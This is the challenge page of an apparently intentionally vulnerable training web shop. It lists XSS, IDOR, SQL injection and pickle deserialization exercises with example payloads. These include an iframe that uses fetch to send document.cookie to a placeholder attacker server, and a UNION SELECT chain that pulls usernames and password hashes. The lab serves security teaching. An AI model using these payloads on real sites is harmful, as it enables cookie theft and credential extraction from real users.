Challenges

Explore as vulnerabilidades intencionais desta aplicação:

  • XSS Reflected

    Goal: Exploit reflected XSS in http://your-server/index.html?affiliate=super-sports-tv.

    Steps:
    1. 1. You must be unlogged in
    2. 2. Open the link in a new tab http://your-server/index.html?affiliate=super-sports-tv.
    Example Payload:
    http://your-server/index.html?affiliate=super-sports-tv<script>alert(1)</script>

  • XSS Stored

    Goal: Exploit stored XSS in comments to steal other users' cookies.

    Steps:
    1. Create a comment with an XSS payload
    2. Use an iframe to bypass restrictions
    3. Capture cookies on your server
    Example Payload:
    <iframe src="javascript:fetch('http://your-server/'+document.cookie)"></iframe>

  • IDOR in Addresses

    Goal: Exploit IDOR to access and modify other users' addresses.

    Steps:
    1. Identify your user ID
    2. Modify the ID in the request
    3. Access/modify other users' data
    Vulnerable Endpoints:
    GET /api/user/{user_id}/address
    PUT /api/user/{user_id}/address

  • SQL Injection in Search

    Goal: Exploit SQL Injection vulnerability in the search endpoint to extract sensitive information.

    Steps:
    1. Use ORDER BY to discover the number of columns
    2. Use UNION SELECT to map the columns
    3. Extract information from the sqlite_master table
    4. Extract user credentials
    Example Payload:
    '
    '--
    ' ORDER BY 1----
    ' ORDER BY 6--
    ' ORDER BY 5--
    A' UNION SELECT 1,2,3,4,5--
    A' UNION SELECT name, sql, 3,4,5 FROM sqlite_master--
    A' UNION SELECT name, sql, 3,4,5 FROM sqlite_master WHERE type='table'--
    A' UNION SELECT 1, username, hashed_password,4,5 FROM users--

  • RCE via Pickle in Cart Backup

    Goal: Exploit insecure deserialization vulnerability in cart backup to execute arbitrary code.

    Steps:
    1. Create a malicious class implementing __reduce__
    2. Serialize the class with pickle
    3. Encode in base64
    4. Send to the import endpoint
    Vulnerable Endpoints:
    GET /api/cart/export
    POST /api/cart/import
    Exploit Script:
    python3 exploit.py
    1. Export current cart
    2. Import malicious cart (with RCE)
    3. Test basic RCE (whoami)
